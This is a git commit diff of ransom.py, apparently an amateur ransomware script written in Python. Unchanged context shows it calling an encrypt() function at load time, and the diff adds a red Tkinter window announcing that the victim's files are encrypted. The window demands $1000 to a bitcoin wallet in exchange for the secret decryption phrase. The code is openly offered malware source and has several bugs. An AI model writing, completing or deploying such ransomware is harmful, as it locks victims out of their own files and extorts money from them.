307f01d567a5527153598cd8f278fdbf9d649f4a
kelvinataga58-rgb <kelvinataga58@gmail.com>
2026-06-24 08:02:51 +0300

    my commit

--- ransom.py
+++ ransom.py
@@ -1,7 +1,7 @@
 from pathlib import Path
 from cryptography.fernet import Fernet
 import sys
-import tinker as tk
+import tkinter as tk
 from  tkinter import messagebox
 from PIL import Image, ImageTk
 import os
@@ -73,7 +73,7 @@ encrypt()
 # create function to dencrypt the file
 def decrypt (user_phrase):
 
-    # ?create a list of all files
+    # create a list of all files
     files =[]
 
     # find al the files and folders
@@ -111,4 +111,97 @@ def decrypt (user_phrase):
             # write changes in the file
             with open (file, "wb") as newFile:
                 newFile.write(decrypted_content)
-decrypt("coffee")
+# submit fuunction
+
+# onclose function
+
+# read files
+def relativePath(relative_path):
+    try :
+        based_path = Path(sys.MEIPASS)  #TEMPORALY FOLDER
+
+    except:
+        based_path = Path(".")
+    return based_path / relative_path
+# define the image path
+image_path = relativePath("images.png")
+
+# we call encryption function
+
+# user interface
+root = tk.Tk()
+root.title("Your Files are Encrypted")
+root.resizable(False, False)
+root.config(bg="#cc0000")
+
+
+# ican image
+icon = tk.PhotoImage(file=relativePath("images.png"))
+root.iconphoto(True,icon)
+
+# define the size of the window
+window_width = 500
+window_height = 450
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+
+x = int((screen_width/2) - (window_width/2))
+y = int((screen_height/2) - (window_height/2))
+
+root.geometry(f"{window_width}x{window_height}+{x}+{y}")
+
+title = tk.Label(
+    root,
+    text="Your files are encrypted",
+    font=("Arial",14,"bold"),
+    bg= "#cc0000",
+    fg="white",
+
+
+
+)
+title.pack(pady=5)
+
+try:
+    image = Image.open(relativePath("images.png"))
+    image = image.resize(80, 80)
+    lock_img =ImageTk.PhotoImage(image)
+    image_label = tk.Label(root, image=lock_img, bg="#cc0000")
+    image_label.pack(pady=(15,5))
+except Exception:
+    pass
+
+
+title2= tk.Label(
+    root,
+    text="Pay $1000 to our bitcoin wallet 6475215454|n to getsecret phrasse to decrypt them |nbefore time runs out!",
+    font=("Arial",12,"bold"),
+    bg= "#cc0000",
+    fg="white",
+    justify= "center"
+
+
+
+)
+title2.pack(pady=10)
+
+msg= tk.Label(
+    root,
+    text="Enter sectret phrase to continue",
+    font=("Arial",12,"bold"),
+    bg= "#cc0000",
+    fg="white",
+    justify= "center"
+
+
+
+)
+msg.pack(pady=5)
+
+input = tk.Entry(root, width=30, font=("Arial", 14))
+input.pack(pady=15)
+input.pack(padx=30)
+# SHOW THE DIALOGUE 
+root.mainloop()
+
+
